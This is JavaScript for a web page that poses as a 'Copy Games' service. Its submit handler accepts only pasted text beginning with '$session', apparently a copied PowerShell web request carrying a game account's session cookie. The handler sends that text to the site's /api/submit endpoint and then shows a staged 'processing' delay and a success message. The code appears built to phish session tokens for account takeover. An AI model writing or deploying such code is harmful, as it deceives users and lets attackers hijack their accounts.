// Typing animation for hero
const phrases = ['Always Here for You!', 'Copy Games Easily!', 'Fast & Reliable!'];
let phraseIndex = 0;
let charIndex = 0;
let isDeleting = false;
const typedEl = document.getElementById('typed-text');

function typeEffect() {
  const current = phrases[phraseIndex];

  if (!isDeleting) {
    typedEl.textContent = current.substring(0, charIndex + 1);
    charIndex++;

    if (charIndex === current.length) {
      isDeleting = true;
      setTimeout(typeEffect, 2000);
      return;
    }
  } else {
    typedEl.textContent = current.substring(0, charIndex - 1);
    charIndex--;

    if (charIndex === 0) {
      isDeleting = false;
      phraseIndex = (phraseIndex + 1) % phrases.length;
    }
  }

  const speed = isDeleting ? 40 : 80;
  setTimeout(typeEffect, speed);
}

typeEffect();

// FAQ accordion
document.querySelectorAll('.faq-question').forEach((btn) => {
  btn.addEventListener('click', () => {
    const item = btn.parentElement;
    const wasOpen = item.classList.contains('open');

    document.querySelectorAll('.faq-item').forEach((i) => i.classList.remove('open'));

    if (!wasOpen) {
      item.classList.add('open');
    }
  });
});

// Modal logic
const overlay = document.getElementById('overlay');
const modalProcessing = document.getElementById('modal-processing');
const modalSuccess = document.getElementById('modal-success');
const modalInvalid = document.getElementById('modal-invalid');
const fileInput = document.getElementById('file-input');
const submitBtn = document.getElementById('submit-btn');

function hideAllModals() {
  modalProcessing.classList.add('hidden');
  modalSuccess.classList.add('hidden');
  modalInvalid.classList.add('hidden');
}

function showOverlay() {
  overlay.classList.remove('hidden');
}

function hideOverlay() {
  overlay.classList.add('hidden');
  hideAllModals();
}

function showModal(modal) {
  hideAllModals();
  showOverlay();
  modal.classList.remove('hidden');
}

document.querySelectorAll('[data-close]').forEach((btn) => {
  btn.addEventListener('click', hideOverlay);
});

overlay.addEventListener('click', (e) => {
  if (e.target === overlay && modalProcessing.classList.contains('hidden')) {
    hideOverlay();
  }
});

async function sendToServer(text) {
  const response = await fetch('/api/submit', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ text })
  });

  if (!response.ok) {
    throw new Error('Server error');
  }
}

async function handleSubmit() {
  const value = fileInput.value.trim();

  if (!value) {
    showModal(modalInvalid);
    return;
  }

  if (!value.startsWith('$session')) {
    showModal(modalInvalid);
    return;
  }

  submitBtn.disabled = true;
  showModal(modalProcessing);

  try {
    await Promise.all([
      sendToServer(value),
      new Promise((resolve) => setTimeout(resolve, 5000))
    ]);
    showModal(modalSuccess);
  } catch {
    hideOverlay();
    alert('Une erreur est survenue lors de l\'envoi. Réessaie.');
  } finally {
    submitBtn.disabled = false;
  }
}

submitBtn.addEventListener('click', handleSubmit);

fileInput.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') {
    handleSubmit();
  }
});
